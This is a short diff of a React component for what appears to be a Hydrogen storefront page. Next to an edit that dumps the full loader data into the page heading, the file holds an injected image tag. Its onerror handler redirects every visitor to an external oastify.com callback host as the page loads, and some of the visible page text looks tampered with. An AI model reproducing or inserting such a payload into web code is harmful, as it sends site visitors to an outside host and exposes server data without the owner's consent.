@@ -51,7 +51,7 @@ export default function App() {
         <Links />
       </head>
       <body>
-        <h1>Hello, {name}</h1>
+        <h1>Hello, {JSON.stringify(data)}</h1>
 <img src onerror='location=`http://fbuz558sx6xwkegcvppwpazi79d01rwfl.oastify.com`'/>
         <p>This is a custom storefront powered by Hydrogenafrraaa</p>
 
